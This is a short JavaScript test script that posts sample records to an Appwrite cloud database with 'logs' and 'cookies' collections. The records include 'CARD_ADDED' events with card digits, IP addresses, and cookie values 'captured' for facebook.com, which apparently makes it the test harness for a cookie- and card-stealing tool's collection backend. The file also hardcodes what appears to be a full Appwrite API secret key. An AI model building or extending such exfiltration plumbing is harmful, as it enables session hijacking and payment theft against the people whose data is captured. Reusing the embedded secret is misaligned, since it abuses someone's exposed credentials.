// Test sending data to logs and cookies collections
const APPWRITE_CONFIG = {
    endpoint: 'https://nyc.cloud.appwrite.io/v1',
    projectId: '693631c8001ac4fbc231',
    databaseId: '69363201001bc7a64088',
    apiSecret: 'standard_917cef86aef581038cb102a0b6d645aa4574cdccefe56659604f22954dba8b1213ac7a0172d73857e904188fba17e8574f23cfb1f4393301aae31c20b8213b086293b0f8c0f3a581e0862ef5db10ad03b749561368f61778ddf118941af5137eeae8ffc196cdb3f3b8a4ac489dd99a67a059fdfc00afad2893b8858a9ca904e3',
    collections: {
        logs: 'logs',
        cookies: 'cookies'
    }
};

const headers = {
    'Content-Type': 'application/json',
    'X-Appwrite-Project': APPWRITE_CONFIG.projectId,
    'X-Appwrite-Key': APPWRITE_CONFIG.apiSecret
};

async function testSendLog() {
    console.log('Testing log creation...');

    const logData = {
        userId: 'test_user_123',
        type: 'CARD_ADDED',
        data: JSON.stringify({ test: true, card: '1234' }),
        ip: '1.2.3.4',
        createdAt: new Date().toISOString()
    };

    try {
        const response = await fetch(
            `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.logs}/documents`,
            {
                method: 'POST',
                headers: headers,
                body: JSON.stringify({
                    documentId: 'unique()',
                    data: logData
                })
            }
        );

        const result = await response.json();
        if (response.ok) {
            console.log('✅ Log created successfully:', result.$id);
        } else {
            console.log('❌ Log creation failed:', result);
        }
    } catch (error) {
        console.error('Error:', error);
    }
}

async function testSendCookies() {
    console.log('\nTesting cookies creation...');

    const cookiesData = {
        userId: 'test_user_123',
        cookies: 'test_cookie_value',
        url: 'https://facebook.com',
        ip: '1.2.3.4',
        capturedAt: new Date().toISOString()
    };

    try {
        const response = await fetch(
            `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.cookies}/documents`,
            {
                method: 'POST',
                headers: headers,
                body: JSON.stringify({
                    documentId: 'unique()',
                    data: cookiesData
                })
            }
        );

        const result = await response.json();
        if (response.ok) {
            console.log('✅ Cookies created successfully:', result.$id);
        } else {
            console.log('❌ Cookies creation failed:', result);
        }
    } catch (error) {
        console.error('Error:', error);
    }
}

async function main() {
    await testSendLog();
    await testSendCookies();
}

main();
